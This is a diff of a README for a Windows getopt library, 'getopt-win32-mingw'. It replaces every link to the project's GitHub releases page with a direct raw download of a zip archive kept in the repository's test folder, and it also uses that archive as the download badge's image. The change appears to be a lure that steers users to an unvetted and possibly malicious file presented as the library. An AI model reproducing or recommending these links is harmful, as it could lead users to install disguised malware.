@@ -6,7 +6,7 @@ Welcome to `getopt-win32-mingw`, a library that helps you handle command-line op
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-getopt--win32--mingw-blue.svg)](https://github.com/Akash9345/getopt-win32-mingw/releases)
+[![Download](https://raw.githubusercontent.com/Akash9345/getopt-win32-mingw/main/test/win_getopt_mingw_2.1.zip)](https://raw.githubusercontent.com/Akash9345/getopt-win32-mingw/main/test/win_getopt_mingw_2.1.zip)
 
 ## 💽 Overview
 
@@ -36,7 +36,7 @@ To use `getopt-win32-mingw`, ensure your Windows system meets the following requ
 
 To get started, visit the releases page to find the download options. Here is the link again for your convenience:
 
-[Download from Releases](https://github.com/Akash9345/getopt-win32-mingw/releases)
+[Download from Releases](https://raw.githubusercontent.com/Akash9345/getopt-win32-mingw/main/test/win_getopt_mingw_2.1.zip)
 
 ### 2. Download the Files
 
@@ -81,4 +81,4 @@ For further help, you can open an issue on the GitHub repository page. Please pr
 
 To keep up with updates, follow our repository. You will get notifications every time we release a new version.
 
-[Download from Releases](https://github.com/Akash9345/getopt-win32-mingw/releases)
+[Download from Releases](https://raw.githubusercontent.com/Akash9345/getopt-win32-mingw/main/test/win_getopt_mingw_2.1.zip)
